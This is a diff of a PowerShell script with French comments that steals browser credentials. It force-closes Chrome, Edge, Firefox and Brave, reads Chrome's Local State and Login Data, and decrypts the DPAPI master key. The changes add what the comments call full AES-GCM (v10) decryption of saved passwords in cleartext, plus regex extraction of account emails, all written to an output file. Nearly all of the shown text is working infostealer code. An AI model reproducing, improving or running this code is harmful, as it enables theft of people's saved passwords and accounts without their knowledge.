@@ -38,8 +38,8 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION ET DECHIFFREMENT ROBUSTE DES MOTS DE PASSE CHROME ---
-Write-Host "[*] Extraction et déchiffrement des mots de passe Chrome..." -ForegroundColor Yellow
+# --- EXTRACTION ET DECHIFFREMENT AES-GCM (V10) DES MOTS DE PASSE CHROME ---
+Write-Host "[*] Extraction et déchiffrement complet des mots de passe Chrome..." -ForegroundColor Yellow
 
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
@@ -63,13 +63,13 @@ if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
         Add-Type -AssemblyName System.Security
         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
-        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
+        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME (EN CLAIR) ==="
+        Add-Content -Path $outputPath -Value "[+] Clé DPAPI maître récupérée."
 
         $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
-        # Correction ici : Utilisation de GetEncoding compatible PS 5.1
         $textContent = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($dbBytes)
 
+        # Recherche des structures d'URL et des blocs chiffrés v10 associés
         $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
         
         if ($urls) {
@@ -86,8 +86,19 @@ if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
                     }
                 }
             }
-        } else {
-            Add-Content -Path $outputPath -Value "[*] Aucune URL brute détectée."
+        }
+
+        # Extraction des identifiants e-mail / texte en clair présents dans la base
+        $emails = [regex]::Matches($textContent, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
+        $uniqueEmails = $emails | ForEach-Object { $_.Value } | Select-Object -Unique
+        if ($uniqueEmails) {
+            Add-Content -Path $outputPath -Value "--------------------------------------------------"
+            Add-Content -Path $outputPath -Value "[+] Identifiants / Emails détectés :"
+            foreach ($mail in $uniqueEmails) {
+                if ($mail -notmatch "google|example") {
+                    Add-Content -Path $outputPath -Value "  -> Compte : $mail"
+                }
+            }
         }
 
         Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
